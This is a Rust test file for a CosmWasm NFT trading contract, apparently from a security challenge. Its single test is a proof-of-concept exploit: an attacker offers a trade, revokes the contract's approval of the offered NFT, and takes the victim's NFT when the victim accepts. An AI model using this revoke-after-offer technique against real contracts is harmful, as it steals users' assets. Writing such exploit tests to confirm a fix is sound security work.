#[cfg(test)]
pub mod tests {
    use crate::{
        integration_tests::tests::{base_scenario, ADMIN, NFT1, USER1},
        msg::{ExecuteMsg, QueryMsg},
        state::Trade,
    };
    use cosmwasm_std::{Addr, Empty};
    use cw721::{Cw721ExecuteMsg, Cw721QueryMsg, OwnerOfResponse};
    use cw_multi_test::Executor;

    pub const ATTACKER: &str = "awesomwasm";
    pub const NFT_1337: &str = "leet-nft";

    #[ignore = "bug is patched"]
    #[test]
    fn exploit() {
        let (mut app, contract_addr, token_addr) = base_scenario();

        // Attacker is an NFT holder
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Mint::<Empty, Empty> {
                token_id: NFT_1337.to_string(),
                owner: ATTACKER.to_string(),
                token_uri: Some("https://www.oaksecurity.io".to_string()),
                extension: Empty::default(),
            },
            &[],
        )
        .unwrap();

        // Attacker gives approval to contract
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            token_addr.clone(),
            &cw721_base::msg::ExecuteMsg::Approve::<Empty, Empty> {
                spender: contract_addr.to_string(),
                token_id: NFT_1337.to_string(),
                expires: None,
            },
            &[],
        )
        .unwrap();

        // Attacker creates trade offer
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::NewTrade {
                target: NFT1.to_string(),
                offered: NFT_1337.to_string(),
            },
            &[],
        )
        .unwrap();

        let trade: Trade = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::GetTrade {
                    id: NFT1.to_string(),
                    trader: ATTACKER.to_string(),
                },
            )
            .unwrap();
        assert_eq!(trade.trader, ATTACKER.to_string());

        // Attacker revokes approval
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            token_addr.clone(),
            &Cw721ExecuteMsg::Revoke {
                spender: contract_addr.to_string(),
                token_id: NFT_1337.to_string(),
            },
            &[],
        )
        .unwrap();

        // Seller accepts trade
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr,
            &ExecuteMsg::AcceptTrade {
                id: NFT1.to_string(),
                trader: ATTACKER.to_string(),
            },
            &[],
        )
        .unwrap();

        // Attacker owns NFT1
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, ATTACKER.to_string());

        // Seller does not own NFT_1337
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr,
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT_1337.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_ne!(owner_of.owner, USER1.to_string());
    }
}
